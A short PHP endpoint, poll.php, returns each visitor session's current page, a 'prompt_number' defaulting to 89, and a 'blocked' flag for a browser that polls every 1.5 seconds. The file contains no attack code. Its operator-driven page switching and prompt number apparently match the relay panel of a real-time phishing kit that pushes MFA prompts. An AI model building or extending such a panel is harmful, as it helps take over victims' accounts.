<?php
// poll.php — Visitor browser polls this every 1.5s
// Returns JSON with current page state for this session

require 'config.php';

header('Content-Type: application/json');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');

session_start();
$sid = $_SESSION['visitor_id'] ?? '';

if (!$sid) {
    echo json_encode(['page' => 'loading', 'prompt_number' => 89]);
    exit;
}

$state = get_state($sid);
echo json_encode([
    'page'          => $state['page']          ?? 'loading',
    'prompt_number' => $state['prompt_number'] ?? 89,
    'blocked'       => $state['blocked']       ?? false,
]);
